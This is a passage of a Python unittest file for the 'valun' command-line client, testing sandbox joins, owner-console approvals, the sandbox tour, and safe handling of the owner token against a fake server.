"""The CLI with circulating credit, against the fake v16 server and sandbox agents of test_agent_circulation.py (offline,
real signatures, throwaway keys, a temporary VALUN_HOME): join writes the local consent policy and sets the owner
mandate's auto_clear (only where the server offers circulation/1), the consents.* and consent_loop settings, `valun
policy show`, `valun clearing status|run`, and `valun sandbox tour` taking a fresh sandbox joiner through the five
steps of design 9.2 with the exact tracker totals after each step; also `valun sandbox earn` and `buy --pay-with`."""
import contextlib
import importlib.metadata
import io
import json
import os
import re
import shlex
import sys
import tempfile
import types
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(HERE), 'src'))
sys.path.insert(0, HERE)
from valun import __version__  # noqa: E402
from valun import agent as va  # noqa: E402
from valun import cli  # noqa: E402
from valun import client as vc  # noqa: E402
from valun import sandbox as sb  # noqa: E402
from test_agent_circulation import (AGENT_TOKEN, CIRC, M_ID, O_ID, SERVER, S_ID, X_ID, World, now_ms, routed,  # noqa: E402
                                    sign_note, wired)

# S's edges (as `valun sandbox tour` prints them) after each step, and the sandbox agents' own edges at the end (design 9.2).
TOUR_TOTALS = {1: {'sandbox-exact -> you': 3},
               2: {'sandbox-exact -> you': 1},
               3: {'sandbox-exact -> you': 0, 'you -> sandbox-exact': 1},
               4: {'sandbox-exact -> you': 0, 'you -> sandbox-exact': 0, 'sandbox-mallory -> you': 2},
               5: {'sandbox-exact -> you': 0, 'you -> sandbox-exact': 0, 'sandbox-mallory -> you': 0}}
TOUR_DONE = ('The tour is complete: you earned 6 PC and spent 6 PC (4 by transfer, 2 with your own note), and set-offs '
             'cancelled 2 PC of your claims and 2 PC of your debts without changing your net position. You can keep trading '
             'with the sandbox agents.')
# What a profile 's' that has not joined tells its owner to run (the 0.7.2 clean-user test): the sandbox join, complete
# as written but for its placeholders, then its uvx form.
SANDBOX_JOIN = 'valun --profile s join --sandbox --handle YOUR-HANDLE --operator "YOUR NAME"'
JOIN_HINT = f'run `{SANDBOX_JOIN}` in a terminal (with uvx: `uvx --from valun=={__version__} valun ...`)'


_REAL_DISTRIBUTION = importlib.metadata.distribution


def _no_valun_install(name):
    """importlib.metadata.distribution, as if no valun were installed: the hints under test then name `valun==X`
    (cli._uvx_from), as for a valun from an index, whatever installed this one (CI: `pip install ./python`, whose
    direct_url.json names the folder's URL, which the hints would name)."""
    if name == 'valun':
        raise importlib.metadata.PackageNotFoundError(name)
    return _REAL_DISTRIBUTION(name)


class Tty(io.StringIO):
    def isatty(self):
        return True


class Cli(unittest.TestCase):
    features = CIRC

    def setUp(self):
        self.home = tempfile.TemporaryDirectory()
        self.addCleanup(self.home.cleanup)
        # HOME and USERPROFILE too: join writes the owner token to $HOME/valun-owner-token-HANDLE.txt when no
        # --owner-token-file is given, never into the real home folder of whoever runs the tests.
        env = mock.patch.dict(os.environ, {'VALUN_HOME': self.home.name, 'HOME': self.home.name, 'USERPROFILE': self.home.name})
        env.start()
        self.addCleanup(env.stop)
        self.world = World(self.features, s_key=None)
        p = routed(self.world)
        p.start()
        self.addCleanup(p.stop)
        # The sandbox helpers' clock: a sleep moves it on at once, so waiting costs nothing and a tour that never
        # finishes reaches its deadline (and fails) in moments instead of hanging.
        clock = [sb.time.time()]
        nap = mock.patch.object(sb, 'time', types.SimpleNamespace(time=lambda: clock[0],
                                                                  sleep=lambda s: clock.__setitem__(0, clock[0] + max(s, 0.001))))
        nap.start()
        self.addCleanup(nap.stop)
        # An enrollment is sent again at once when no answer is read.
        fast = mock.patch.object(vc, 'ENROLL_RETRY_S', (0, 0))
        fast.start()
        self.addCleanup(fast.stop)
        self.token_file = os.path.join(self.home.name, 'owner.txt')
        meta = mock.patch('importlib.metadata.distribution', _no_valun_install)
        meta.start()
        self.addCleanup(meta.stop)

    def run_cli(self, *argv, stdin=None, tty=False, answers=None):
        out = Tty() if tty else io.StringIO()
        patches = [contextlib.redirect_stdout(out)]
        if stdin is not None or tty:
            patches.append(mock.patch.object(sys, 'stdin', Tty(stdin or '') if tty else io.StringIO(stdin)))
        if answers is not None:
            patches.append(mock.patch('builtins.input', side_effect=answers))
        with contextlib.ExitStack() as stack:
            for x in patches:
                stack.enter_context(x)
            rc = cli.main(['--profile', 's', *argv])
        return rc, out.getvalue()

    def join(self, *extra, sandbox=True):
        args = ['join', '--handle', 'stranger', '--operator', 'Ann', '--approvals', 'none', '--server', SERVER,
                '--owner-token-file', self.token_file, *extra]
        args.append('--sandbox' if sandbox else '--invite-from-stdin')
        rc, out = self.run_cli(*args, stdin=None if sandbox else 'invite-code\n')
        self.assertEqual(rc, 0, out)
        return out

    def disk(self):
        with open(os.path.join(self.home.name, 'profiles', 's.json'), encoding='utf-8') as f:
            return json.load(f)

    def main(self, argv, env=None):
        """cli.main(argv) as given (no --profile added), with VALUN_PROFILE and VALUN_SERVER unset (then `env` set), as a
        command run in another shell: (rc, output)."""
        out = io.StringIO()
        with mock.patch.dict(os.environ), contextlib.redirect_stdout(out):
            for k in ('VALUN_PROFILE', 'VALUN_SERVER'):
                os.environ.pop(k, None)
            os.environ.update(env or {})
            rc = cli.main(argv)
        return rc, out.getvalue()

    def printed(self, out, before):
        """The command the CLI printed (in backquotes) after the words `before`, as argv for main(): exactly as printed,
        but for the placeholder FILE, which stands for the owner token file."""
        m = re.search(re.escape(before) + r' `valun ([^`]+)`', out)
        self.assertIsNotNone(m, out)
        return [self.token_file if a == 'FILE' else a for a in shlex.split(m.group(1))]

    def other_profile(self, name, **state):
        """Another identity's profile file (another participant: O_ID unless given); returns its path and its bytes."""
        path = os.path.join(self.home.name, 'profiles', f'{name}.json')
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(dict({'server': SERVER, 'participant_id': O_ID, 'approvals': 'ask'}, **state), f)
        with open(path, 'rb') as f:
            return path, f.read()

    def unchanged(self, path, before):
        with open(path, 'rb') as f:
            self.assertEqual(f.read(), before, path)


class Join(Cli):
    def test_a_sandbox_join_signs_all_three_roles_and_runs_the_loop(self):
        out = self.join()
        disk = self.disk()
        self.assertEqual((disk['consent_policy'], disk['consent_loop']), (va.SANDBOX_CONSENT_POLICY, 'on'))
        self.assertEqual(self.world.puts, [{'approve_above': 5, 'auto_clear': True}])
        self.assertIn('Clearing: auto.', out)
        self.assertNotIn('vpo_test-only', json.dumps(disk))

    def test_clearing_off_turns_auto_clear_off(self):
        self.join('--clearing', 'off')
        self.assertEqual(self.world.puts, [{'approve_above': 5, 'auto_clear': False}])

    def test_an_invite_join_does_not_accept_transfers_by_itself(self):
        self.join(sandbox=False)
        disk = self.disk()
        self.assertEqual((disk['consent_policy'], disk['consent_loop']), (va.INVITE_CONSENT_POLICY, 'off'))
        self.assertEqual(va.INVITE_CONSENT_POLICY, {'setoff': True, 'as_issuer': True, 'as_new_creditor': False, 'max_PC': 50})


class ConsoleByDefault(Cli):
    """Fitz's decision of 2026-11-17 (fix inbox #138): `valun join --sandbox` holds commitments for the owner console
    when --approvals is not given; an invited join still asks. The owner token goes to a file the owner can find, and
    `valun console` opens the console: its address, where the token is (never the token), what waits there."""

    def test_a_sandbox_join_without_approvals_uses_console_and_says_how_to_change_it(self):
        rc, out = self.run_cli('join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--server', SERVER,
                               '--owner-token-file', self.token_file)
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.world.puts, [{'approve_above': 0, 'review_deliveries': True, 'auto_clear': True}])
        disk = self.disk()
        self.assertEqual((disk['approvals'], disk['owner_token_file']), ('console', os.path.abspath(self.token_file)))
        self.assertIn('Approvals: console. Your agent signs at once and asks nobody', out)
        self.assertIn(cli.CONSOLE_HOLDS, out)
        self.assertIn('`valun --profile s console` opens the console and says what approving and rejecting do', out)
        self.assertIn('Console is what `join --sandbox` uses when --approvals is not given. To change it: `valun --profile s '
                      f'config approvals MODE --owner-token-file {cli._faithful(self.token_file, 300)}`', out)
        self.assertNotIn('vpo_test-only', json.dumps(disk))
        # The Nov 18 fresh-join run (finding 3): the console paragraph was about 400 of join's 614 words. It is three
        # lines and a link now; `valun console` says what approving and rejecting do (CONSOLE_DECIDES).
        line = next(x for x in out.splitlines() if x.startswith('Approvals: console.'))
        self.assertLessEqual(len(line), 4 * 118, line)
        self.assertTrue(line.endswith(f'says what approving and rejecting do ({cli.CONSOLE_DOC}).'), line)
        self.assertNotIn(cli.CONSOLE_DECIDES, out)
        self.assertLess(len(out.split()), 400, f'{len(out.split())} words')

    def test_an_invited_join_still_asks_and_any_mode_can_be_given(self):
        rc, out = self.run_cli('join', '--invite-from-stdin', '--handle', 'stranger', '--operator', 'Ann', '--server', SERVER,
                               '--owner-token-file', self.token_file, stdin='invite-code\n')
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.disk()['approvals'], 'ask')
        self.assertIn('Approvals: ask. Before your agent signs a commitment', out)
        self.assertNotIn('Console is what', out)
        for mode in ('ask', 'none', 'client-prompt'):
            with self.subTest(mode=mode):
                rc, out = self.main(['--profile', f'm-{mode}', 'join', '--sandbox', '--handle', 'stranger', '--operator',
                                     'Ann', '--approvals', mode, '--server', SERVER, '--owner-token-file',
                                     os.path.join(self.home.name, f'owner-{mode}.txt')])
                self.assertEqual(rc, 0, out)
                with open(os.path.join(self.home.name, 'profiles', f'm-{mode}.json'), encoding='utf-8') as fh:
                    self.assertEqual(json.load(fh)['approvals'], mode)
                self.assertIn(f'Approvals: {mode}.', out)

    def test_join_help_says_what_each_mode_does(self):
        out = io.StringIO()
        with contextlib.redirect_stdout(out), self.assertRaises(SystemExit):
            cli.main(['join', '--help'])
        words = ' '.join(out.getvalue().split())
        for w in ('default: console with --sandbox, ask without', 'console: your agent signs at once',
                  'never an honor of a guarantee call', 'ask: your MCP app shows you an approval form',
                  "own confirmation of each signing tool call; whatever it lets run is signed", 'none: your agent signs on its own',
                  'default: $HOME/valun-owner-token-HANDLE.txt'):
            self.assertIn(w, words)

    def console(self, *extra, env=None):
        opened = []
        with mock.patch.object(cli.webbrowser, 'open', lambda url: opened.append(url) or True), \
                mock.patch.dict(os.environ, env or {}):
            rc, out = self.run_cli('console', *extra)
        return rc, out, opened

    def test_valun_console_prints_the_address_and_the_token_file_and_opens_it(self):
        self.run_cli('join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--server', SERVER,
                     '--owner-token-file', self.token_file)
        with mock.patch.object(cli, '_no_browser', lambda: None):
            rc, out, opened = self.console()
        self.assertEqual((rc, opened), (0, [f'{SERVER}/pilot#owner']))
        self.assertIn(f'Owner console: {SERVER}/pilot#owner (participant {S_ID}, profile s)', out)
        self.assertIn(f'Sign in with your owner token: it is in {self.token_file}', out)
        # what waits there is the mandate's, which this command does not read: it says what console sets it to
        self.assertIn('Approvals: console. What waits for you there, with the owner mandate console sets (Ask me above 0, '
                      'Review deliveries on; the console shows yours): ' + cli.CONSOLE_HOLDS, out)
        self.assertIn('Opened it in your default browser.', out)
        self.assertNotIn('vpo_test-only', out)                       # never the token itself
        rc, out, opened = self.console('--no-open')
        self.assertEqual((rc, opened), (0, []))
        self.assertIn('Not opened in a browser (you passed --no-open): open the address above in a browser yourself.', out)
        os.remove(self.token_file)                                   # moved into a password manager
        rc, out, opened = self.console('--no-open')
        self.assertIn('which is no longer there (moved into your password manager?)', out)

    def test_valun_console_opens_no_browser_on_a_headless_machine(self):
        self.join()
        with mock.patch.object(cli.sys, 'platform', 'linux'):
            rc, out, opened = self.console(env={'DISPLAY': '', 'WAYLAND_DISPLAY': '', 'BROWSER': ''})
        self.assertEqual((rc, opened), (0, []))
        self.assertIn('Not opened in a browser (this machine has no display (headless))', out)
        # the 0.7.2 review: it does not read the mandate, so it never asserts what Ask me above is now
        self.assertIn('Approvals: none. The console holds only what your owner mandate holds, as the console shows it', out)
        self.assertIn('Where valun set your mandate (at join, or when this profile left console approvals), Ask me above is '
                      'your per-deal limit', out)
        self.assertNotIn('In this mode valun sets approve_above', out)
        with mock.patch.object(cli.sys, 'platform', 'linux'):
            rc, out, opened = self.console(env={'DISPLAY': ':0'})
        self.assertEqual(opened, [f'{SERVER}/pilot#owner'])
        with mock.patch.object(cli, '_no_browser', lambda: None), mock.patch.object(cli.webbrowser, 'open', lambda url: False):
            rc, out = self.run_cli('console')
        self.assertIn('No browser could be opened here: open the address above in a browser yourself.', out)

    def test_valun_console_before_a_join(self):
        rc, out, opened = self.console('--no-open', '--server', SERVER)
        self.assertEqual(rc, 0, out)
        self.assertIn(f'Owner console: {SERVER}/pilot#owner', out)
        self.assertIn("Profile 's' is not joined yet, so it has no owner token: join first, `valun --profile s join --sandbox", out)
        self.assertNotIn('Approvals:', out)              # nothing waits for a profile that has not joined

    def console_tour(self, *extra, tty=False):
        """`valun sandbox tour` of a console join, with sandbox.tour recorded instead of run: (rc, output, its kwargs)."""
        seen = {}

        def tour(store, **kw):
            seen.update(kw)
            return {'done': True, 'steps': []}
        with mock.patch.object(sb, 'tour', tour):
            rc, out = self.run_cli('sandbox', 'tour', *extra, tty=tty)
        return rc, out, seen

    def test_the_tour_in_console_mode_asks_nothing_here_and_says_where_its_steps_wait(self):
        # The server holds what the tour signs for the owner console: a terminal prompt as well would ask twice.
        self.run_cli('join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--server', SERVER,
                     '--owner-token-file', self.token_file)
        self.world.mandate.update(approve_above=0, review_deliveries=True)     # what the join's mandate PUT set
        rc, out, seen = self.console_tour()                     # no terminal: in console mode nothing is asked here
        self.assertEqual(rc, 0, out)
        self.assertEqual((seen['yes'], seen['ask'], seen['console_command'], seen['console']),
                         (True, None, 'valun --profile s console', True))
        # the 0.7.2 review: the tour's payments by transfer (steps 2 and 5) wait 20 minutes only
        self.assertIn(f'Console approvals: the tour asks nothing here. What it signs for your agent waits for you in the owner '
                      f'console ({SERVER}/pilot#owner; `valun --profile s console` opens it): its offers and acceptances, the '
                      'IOUs it pays with (approve each by the deadline its card shows, within the hour), and its payments by '
                      'transfer (steps 2 and 5), which wait only 20 minutes before they end (the tour then signs them '
                      'again).', out)

    def test_a_console_tour_asks_here_once_the_mandate_no_longer_holds_every_step(self):
        """The 0.7.2 review: the tour took the profile's mode for the mandate, so an owner who had raised Ask me above or
        unticked Review deliveries since had those steps signed, and taking effect, with nobody asked."""
        self.run_cli('join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--server', SERVER,
                     '--owner-token-file', self.token_file)
        for change in ({'approve_above': 0, 'review_deliveries': False}, {'approve_above': 5, 'review_deliveries': True}):
            self.world.mandate.update(change)
            rc, out, seen = self.console_tour()
            self.assertEqual((rc, seen), (3, {}), out)                  # nobody at this terminal: nothing runs
            self.assertIn('Your profile uses console approvals, but your owner mandate no longer holds every step of the tour '
                          'for you in the owner console (Ask me above ', out)
            self.assertIn('the tour asks you here before each commitment instead.', out)
            rc, out, seen = self.console_tour(tty=True)
            self.assertEqual((rc, seen['yes'], seen['ask'], seen['console']), (0, False, cli._ask_terminal, False))
            rc, out, seen = self.console_tour('--yes')                  # --yes: signed at once, held as the mandate holds
            self.assertEqual((rc, seen['yes'], seen['ask'], seen['console']), (0, True, None, False))
            self.assertIn('with --yes the tour signs at once every commitment its own rules allow, and only what your '
                          'mandate holds waits there.', out)
            self.assertNotIn('the tour asks you here', out)
        self.world.fail['GET /pilot/v1/me'] = [vc.ValunError('unauthorized', 'revoked', 401)]
        rc, out, seen = self.console_tour(tty=True)
        self.assertEqual((rc, seen), (1, {}))
        self.assertIn('Cannot read your owner mandate (unauthorized): revoked. Nothing was signed.', out)

    def test_tour_yes_help_says_console_still_holds_each_step(self):
        out = io.StringIO()
        with contextlib.redirect_stdout(out), self.assertRaises(SystemExit):
            cli.main(['sandbox', 'tour', '--help'])
        words = ' '.join(out.getvalue().split())
        self.assertIn("approve here, without asking, every commitment the tour's own rules allow", words)
        self.assertIn('with console approvals each step still waits for you in the owner console', words)

    def test_buy_says_where_each_held_step_waits_and_stops_on_a_rejected_offer(self):
        # The 0.7.2 review: `sandbox buy` logged proposed_awaiting_owner without saying where to approve it (earn did),
        # and waited out its deadline on an offer the owner had rejected.
        lines, views = [], iter([{'status': 'rejected_by_owner'}])
        stub = types.SimpleNamespace(state={'server': SERVER + '/'}, participant_id=S_ID, unit='PC', network=None,
                                     directory=lambda: [{'id': X_ID, 'handle': 'sandbox-exact'}],
                                     propose=lambda *a: {'id': 'vd_0123456789abcdef', 'status': 'proposed_awaiting_owner'},
                                     deal=lambda did: next(views))
        with mock.patch.object(sb.vc, 'Client', lambda store, server=None: stub):
            r = sb.buy(None, 'sandbox-exact', 'text-stats', 'hi', server=SERVER, log=lines.append, poll_s=0)
        self.assertEqual(r, {'deal_id': 'vd_0123456789abcdef', 'status': 'rejected_by_owner', 'verified': None})
        self.assertIn(f'  your offer waits for you in the owner console ({SERVER}/pilot#owner): approve it there, and this '
                      'goes on by itself', lines)
        self.assertEqual(lines[-1], 'deal vd_0123456789abcdef: rejected_by_owner')
        self.assertIn('within 20 minutes', sb.owner_hint(stub, 'completion_awaiting_owner'))
        self.assertIsNone(sb.owner_hint(stub, 'agreed'))

    def test_earn_says_where_a_held_acceptance_waits(self):
        lines = []
        states = iter(['accepted_awaiting_owner', 'expired'])
        c = types.SimpleNamespace(state={'server': SERVER + '/'}, participant_id=S_ID,
                                  deal=lambda did: {'status': next(states), 'current': None})
        r = sb._deliver_and_wait(c, 'vd_0123456789abcdef', 'text-stats', 'x', 2, 60, lines.append, 0)
        self.assertEqual(r['status'], 'expired')
        self.assertIn(f'  your acceptance waits for you in the owner console ({SERVER}/pilot#owner): approve it there, and '
                      'this goes on by itself', lines)

    def test_an_attempt_the_server_held_and_never_sent_is_listed_as_not_applied(self):
        c = types.SimpleNamespace(unit='nanoERG', pubkey='02' + '11' * 32)
        row = {'ref': '#1', 'edge': f"{'02' + '11' * 32}>{'03' + '22' * 32}", 'route': 'note', 'prior': 3, 'total': 5,
               'timestamp': 1_794_957_033_997, 'attempt_id': None, 'outcome': 'not_applied', 'paid': False,
               'server_ended': {'state': 'rejected', 'approval_id': 'va_17df22079678', 'at': None}, 'state': 'alive'}
        line = cli._attempt_line(c, row)
        # the RC's staging test (2026-11-18): the console names the server's time, a minute sooner, so this one says
        # what it is
        self.assertIn(': not applied (the server held it for your owner, who rejected it in the owner console, and never '
                      "sent it on). A new IOU of this deal can be signed now, while the pair's IOU is unchanged; paying it by "
                      "transfer waits until after 2026-11-18T00:12:33.997Z (your Valun client's time, a minute after the "
                      "server's, which the owner console shows, as a margin for clocks that differ), or until your client "
                      'sees this IOU move past it', line)
        self.assertNotIn('you resolved it', line)
        self.assertIn('did not apply (the server held it for your owner and never sent it on: its hold expired before your '
                      'owner decided)', cli._attempt_line(c, dict(row, state='dead', server_ended={'state': 'void_expired'})))
        # The 0.7.2 review: a payment by transfer held and rejected frees a transfer through the same IOU at the same
        # prior state, never a new IOU of the deal (the client refuses that until the window has passed).
        transfer = dict(row, route='transfer', timestamp=1_794_957_033_999, edge=f"{'03' + '33' * 32}>{'02' + '11' * 32}",
                        server_ended={'state': 'rejected', 'approval_id': 'va_27df22079678', 'at': None})
        line = cli._attempt_line(c, transfer)
        self.assertIn('A payment through the same IOU at the same prior state can be signed now; your own IOU or any other '
                      f'payment of this deal waits until after 2026-11-18T00:12:33.999Z ({va.MARGIN_WORDS}), or until your '
                      'client sees that IOU move past it', line)
        self.assertNotIn('A new IOU of this deal can be signed now', line)
        # one approved after its hour was sent, and refused: never "never sent it on"
        late = cli._attempt_line(c, dict(row, state='dead', server_ended={'state': 'novation_expired'}))
        self.assertIn('did not apply (your owner approved it after its hour, and the tracker refused it)', late)
        self.assertNotIn('never sent', late)
        # a transfer that expired (its own state: waiting for the owner, or collecting signatures after an approval)
        self.assertIn('it expired before every party had signed it (while it waited for your owner, or while it collected '
                      'signatures)', cli._attempt_line(c, dict(transfer, state='dead', server_ended={'state': 'expired'})))

    def test_doctor_names_the_console_command_in_console_mode(self):
        self.run_cli('join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--server', SERVER,
                     '--owner-token-file', self.token_file)
        rc, out = self.run_cli('doctor')
        self.assertIn('Approvals: console. ' + cli.APPROVAL_TEXT['console'] + ' `valun --profile s console` opens the owner '
                      'console.', out)


class JoinWithoutCirculation(Cli):
    features = None

    def test_the_mandate_put_is_as_in_0_3_and_the_policy_waits_locally(self):
        out = self.join('--clearing', 'off')
        self.assertEqual(self.world.puts, [{'approve_above': 5}])            # no auto_clear: the field does not exist yet
        self.assertEqual(self.disk()['consent_policy'], va.SANDBOX_CONSENT_POLICY)
        self.assertIn('does not offer circulating credit yet', out)
        self.assertNotIn('Clearing:', out)

    def test_the_next_block_has_both_branches_without_circulation_too(self):
        # The Nov 18 fresh-join run (finding 3): 0.7.1 ended with the MCP line only, and the RC added the shell line only
        # where the server offers circulating credit. Without it there is nothing to sign in the background, and a shell
        # agent still reads its inbox regularly.
        out = self.join()
        self.assertTrue(out.endswith(
            'Next: run `valun --profile s doctor`, then, for your agent, one of:\n'
            '  - In an MCP app: add `valun --profile s mcp` to it (see `valun mcp --help`).\n'
            '  - From a shell: run `valun --profile s call valun_inbox` regularly, which shows what waits for your agent '
            f'(with uvx: `uvx --from valun=={__version__} valun ...`).\n'), out)


class JoinKeepsTheOwnerToken(Cli):
    """FX2-PY: `valun join` hands the owner token over (writes --owner-token-file, or the default file
    $HOME/valun-owner-token-HANDLE.txt, and shows it only when that file cannot be written) right after enrolment, before
    the pin and mandate steps, so an error in those steps (a 429 here) never loses it; join then says what is not in
    force and how to finish, and exits 1."""
    RATE = ('rate_limited', 'too many requests; slow down', 429)

    def rate_limit(self, route):
        self.world.fail[route] = [vc.ValunError(*self.RATE)]

    def run_join(self, *extra, file=True):
        return self.run_cli('join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--server', SERVER, *extra,
                            *(['--owner-token-file', self.token_file] if file else []))

    def token_in_file(self, path=None):
        with open(path or self.token_file, encoding='utf-8') as f:
            return f.read()

    def default_file(self, handle='stranger'):
        """Where join writes the owner token without --owner-token-file: $HOME/valun-owner-token-HANDLE.txt (the
        test's home)."""
        return os.path.join(self.home.name, f'valun-owner-token-{handle}.txt')

    def test_the_token_is_handed_over_before_the_pin_and_mandate_steps(self):
        seen, handle = [], self.world.handle

        def spy(method, path, body=None, token=None):
            seen.append((f'{method} {path}', os.path.exists(self.token_file)))
            return handle(method, path, body, token)
        self.world.handle = spy
        self.rate_limit('GET /pilot/v1/owner')
        rc, out = self.run_join('--approvals', 'none')
        self.assertEqual(rc, 1, out)
        self.assertEqual(self.token_in_file(), 'vpo_test-only\n')
        self.assertEqual([r for r, _ok in seen][:2], ['POST /pilot/v1/join-sandbox', 'POST /pilot/v1/enroll'])
        self.assertEqual([r for r, ok in seen[2:] if not ok], [])          # the token file exists before each later step
        self.assertIn('GET /pilot/v1/info', [r for r, _ok in seen[2:]])    # the pin step
        self.assertIn('Your owner mandate could not be set (rate_limited): too many requests; slow down', out)
        self.assertLess(out.index('Your OWNER token is in'), out.index('could not be set'))
        disk = self.disk()
        self.assertEqual((disk['participant_id'], disk['approvals']), (S_ID, 'none'))
        self.assertNotIn('vpo_test-only', json.dumps(disk))
        self.assertEqual(self.world.puts, [])

    def test_a_429_on_the_mandate_put_without_a_file_writes_the_default_file_first(self):
        # No --owner-token-file: the token goes to $HOME/valun-owner-token-HANDLE.txt (a new private file) before the
        # mandate step, never to the screen, and the profile keeps that path (never the token) for `valun console`.
        self.rate_limit('PUT /pilot/v1/owner/mandate')
        rc, out = self.run_join('--approvals', 'none', file=False)
        self.assertEqual(rc, 1, out)
        self.assertEqual(self.token_in_file(self.default_file()), 'vpo_test-only\n')
        self.assertNotIn('vpo_test-only', out)
        self.assertIn(f'Your OWNER token is in {self.default_file()} (no --owner-token-file was given: this is where join '
                      'writes it).', out)
        self.assertLess(out.index('Your OWNER token is in'), out.index('Your owner mandate could not be set (rate_limited)'))
        self.assertIn('approve_above in your owner mandate was not set', out)
        disk = self.disk()
        self.assertNotIn('vpo_test-only', json.dumps(disk))
        self.assertEqual(disk['owner_token_file'], os.path.abspath(self.default_file()))

    # ---------- the Nov 18 fresh-join run, finding 4: the owner token never on stdout ----------
    def refused(self, rc, out, path):
        """join sent nothing (no request reached the server, no profile, no key), said why, and exited 2."""
        self.assertEqual(rc, 2, out)
        self.assertTrue(out.startswith('Nothing was sent: '), out)
        self.assertIn(path, out)
        self.assertIn('and run this join again: `valun --profile s join --sandbox --handle stranger --operator Ann', out)
        self.assertIn(f"--owner-token-file FILE --server {SERVER}` (FILE: a new file for this join's owner token).", out)
        self.assertEqual(self.world.requests(), [])
        self.assertFalse(os.path.exists(os.path.join(self.home.name, 'profiles', 's.json')))
        self.assertNotIn('vpo_', out)

    def test_an_existing_token_file_is_refused_before_anything_is_sent(self):
        # 0.7.1 and the RC sent the join, made the participant, printed its owner token on stdout (an agent's context)
        # and exited 1. The file keeps its bytes (it may hold another identity's token).
        with open(self.token_file, 'w', encoding='utf-8') as f:
            f.write('vpo_another-identity\n')
        rc, out = self.run_join('--approvals', 'none')
        self.refused(rc, out, self.token_file)
        self.assertIn(f'Nothing was sent: {self.token_file} exists already, and join never replaces a file: it may hold '
                      'another owner token. Name a new file, one that does not exist yet, and run this join again', out)
        self.assertEqual(self.token_in_file(), 'vpo_another-identity\n')

    def test_without_a_file_an_existing_default_file_is_refused_before_anything_is_sent(self):
        # The RC's second way in: no --owner-token-file, and $HOME/valun-owner-token-HANDLE.txt there already (another
        # join of this handle, say, or a retry). Refused the same way; the default file keeps its bytes.
        with open(self.default_file(), 'w', encoding='utf-8') as f:
            f.write('vpo_another-identity\n')
        rc, out = self.run_join('--approvals', 'none', file=False)
        self.refused(rc, out, self.default_file())
        self.assertIn(f'{self.default_file()} exists already (join writes your owner token there when no '
                      '--owner-token-file is given), and join never replaces a file', out)
        self.assertEqual(self.token_in_file(self.default_file()), 'vpo_another-identity\n')

    def test_a_token_file_in_a_missing_folder_is_refused_before_anything_is_sent(self):
        self.token_file = os.path.join(self.home.name, 'no-such-folder', 'owner.txt')
        rc, out = self.run_join('--approvals', 'none')
        self.refused(rc, out, self.token_file)
        self.assertIn(f'the folder of {self.token_file}, {os.path.dirname(self.token_file)}, does not exist, so your owner '
                      'token could not be written there. Name a new file in a folder that exists', out)
        self.assertFalse(os.path.exists(os.path.dirname(self.token_file)))

    def test_a_folder_that_takes_no_new_file_is_refused_before_anything_is_sent(self):
        # A read-only grant, or Windows' Controlled folder access: home.new_file_refused's probe file cannot be made.
        home = os.path.normcase(os.path.abspath(self.home.name))
        with mock.patch.object(cli, 'new_file_refused',
                               lambda folder: 'Access is denied.' if os.path.normcase(folder) == home else None):
            rc, out = self.run_join('--approvals', 'none')
        self.refused(rc, out, self.token_file)
        self.assertIn(f'this user may not create a file in {self.home.name} (Access is denied), where {self.token_file} '
                      'would go. Name a new file in a folder you can write', out)

    def test_a_token_file_that_appears_while_the_join_is_on_its_way_goes_to_a_new_file_beside_it(self):
        # The race: the file was not there when join checked, and is there when the token is written. It is never
        # replaced; the token goes to owner.1.txt (owner.2.txt when that is taken too), which join names, and never to
        # stdout. Join does its other steps, and exits 1: the file named does not hold this token.
        handle, sibling = self.world.handle, os.path.join(self.home.name, 'owner.1.txt')

        def another_join(method, path, body=None, token=None):
            if path == '/pilot/v1/join-sandbox':
                for p in (self.token_file, sibling):
                    with open(p, 'w', encoding='utf-8') as f:
                        f.write('vpo_another-identity\n')
            return handle(method, path, body, token)
        self.world.handle = another_join
        rc, out = self.run_join('--approvals', 'none')
        self.assertEqual(rc, 1, out)
        newer = os.path.join(self.home.name, 'owner.2.txt')
        self.assertEqual((self.token_in_file(), self.token_in_file(sibling), self.token_in_file(newer)),
                         ('vpo_another-identity\n', 'vpo_another-identity\n', 'vpo_test-only\n'))
        self.assertIn(f'{self.token_file} appeared after join checked it, and join never replaces a file (it may hold '
                      f'another owner token), so your OWNER token is in a new file beside it: {newer}.', out)
        self.assertNotIn('vpo_', out)
        self.assertLess(out.index('your OWNER token is in a new file'), out.index('Joined Valun as stranger'))
        self.assertEqual(self.world.puts, [{'approve_above': 5, 'auto_clear': True}])    # the other steps were done
        self.assertEqual(self.disk()['owner_token_file'], os.path.abspath(newer))           # for `valun console`
        self.assertEqual(out.rstrip().splitlines()[-1],
                         f'Exit code 1: {self.token_file} was not written: your owner token is in {os.path.abspath(newer)}.')

    def no_file_at_all(self):
        """_write_private fails for every file (the disk filled up after join checked the folder, which it does with a
        probe file of its own, not with _write_private)."""
        return mock.patch.object(cli, '_write_private', side_effect=OSError(*self.DISK_FULL))

    def test_when_no_file_can_be_written_the_token_is_shown_on_a_terminal_only(self):
        # Not a terminal (an agent's pipe): the token is shown nowhere, on stdout or stderr, and join says how the owner
        # gets a new one. A terminal: on stderr only, never on stdout.
        for tty in (False, True):
            with self.subTest(tty=tty):
                err = Tty() if tty else io.StringIO()
                with self.no_file_at_all(), contextlib.redirect_stderr(err):
                    rc, out = self.run_cli('--profile', f'nf{int(tty)}', 'join', '--sandbox', '--handle', 'stranger',
                                           '--operator', 'Ann', '--approvals', 'none', '--server', SERVER,
                                           '--owner-token-file', os.path.join(self.home.name, f'nf{int(tty)}.txt'))
                self.assertEqual(rc, 1, out)
                self.assertNotIn('vpo_', out)
                self.assertIn(f"Cannot write {os.path.join(self.home.name, f'nf{int(tty)}.txt')} (No space left on device).", out)
                if tty:
                    self.assertIn('\n  vpo_test-only\n', err.getvalue())
                    self.assertIn('Your owner token was shown once on this terminal (stderr), never on stdout', out)
                else:
                    self.assertNotIn('vpo_', err.getvalue())
                    self.assertIn('Your owner token was not shown either: stderr is not a terminal here, and an agent may '
